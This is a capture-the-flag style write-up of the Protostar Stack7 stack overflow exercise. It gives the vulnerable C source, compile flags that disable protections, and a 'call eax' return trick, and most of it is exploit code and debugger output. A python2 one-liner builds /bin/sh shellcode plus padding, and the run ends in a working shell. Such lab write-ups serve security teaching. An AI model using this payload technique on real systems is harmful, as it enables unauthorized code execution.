## Protostar-Stack7 Solution

### 1. Introduction

This is a poc solution for the "Stack7" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419082500/https://exploit-exercises.com/protostar/stack7/](https://web.archive.org/web/20170419082500/https://exploit-exercises.com/protostar/stack7/) 

**Hints:**
* Stack6 introduces return to .text to gain code execution.
* The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.


#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o stack7 stack7.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb

This one is similar to stack5 since we're able to write our payload onto eax register.

#### 2.2 Quick Solution

Let's use same payload from stack 5, exploit.bin by increasing the offset by 3.

```
$ hexdump -v exploit.bin
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 0080

$ python2 -c 'import sys; sys.stdout.write("A"*57)' >> exploit.bin

$ hexdump -v exploit.bin 
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141 4141 4141
```

Let's find a **call eax** instruction from stack7 binary.

```nasm
$ objdump -d stack7 -M intel | grep "call" | grep "eax"
 8048466:	ff d0                	call   eax
 80484ef:	ff d0                	call   eax
```


Let's choose the address **8048466** in our exploit.

```x86asm
$ echo -ne "\x66\x84\x04\x08" >> exploit.bin
```

Final exploit.

```x86asm
$ hexdump -v exploit.bin 
0000000 c031 6850 2f6e 6873 2f68 622f 8969 31e3
0000010 31c9 b0d2 cd0b 4180 4141 4141 4141 4141
0000020 4141 4141 4141 4141 4141 4141 4141 4141
0000030 4141 4141 4141 4141 4141 4141 4141 4141
0000040 4141 4141 4141 4141 4141 4141 4141 4141
0000050 8466 0804 
```

Following outputs is from another vm which has peda installed.

```nasm
gdb-peda$ r < exploit.bin
Starting program: stack7 < exploit.bin
input path please: got path 1�Phn/shh//bi��1�1Ұ
...TRIM...
[----------------------------------registers-----------------------------------]
EAX: 0x804b008 --> 0x6850c031 
EIP: 0x804b008 --> 0x6850c031
...TRIM...               
-------------------------------------code-------------------------------------                  0x804b001:	add    BYTE PTR [eax],al
   0x804b003:	add    BYTE PTR [ecx+0x0],ah
   0x804b006:	add    BYTE PTR [eax],al
=> 0x804b008:	xor    eax,eax  <== Our shellcode
   0x804b00a:	push   eax
   0x804b00b:	push   0x68732f6e
   0x804b010:	push   0x69622f2f
   0x804b015:	mov    ebx,esp            
...TRIM...                                              
gdb-peda$ x/21wx $eax
0x804b008:	0x6850c031	    0x68732f6e	0x622f2f68	0x31e38969
0x804b018:	0xb0d231c9	    0x4180cd0b	0x41414141	0x41414141
0x804b028:	0x41414141	    0x41414141	0x41414141	0x41414141
0x804b038:	0x41414141	    0x41414141	0x41414141	0x41414141
0x804b048:	=>0x08048466<=	0x41414141	0x41414141	0x41414141
0x804b058:	0x08048466
```
There is something wrong with data that I write on **eax** on debugger but it worked on another VM which doesn't have gdb-peda. 

Final poc works properly as well.

#### 2.3 Final PoC

```py
$ python2 -c 'import sys; sys.stdout.write("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A"*57 + "\x66\x84\x04\x08")' > x.bin

$ (cat x.bin; cat) | ./stack7
input path please: X
got path 1�Phn/shh//bi��1�1Ұ
                            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf�AAAAAAAAAAAAf�X
id
uid=1000(a) gid=1000(a) groups=1000(a),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```
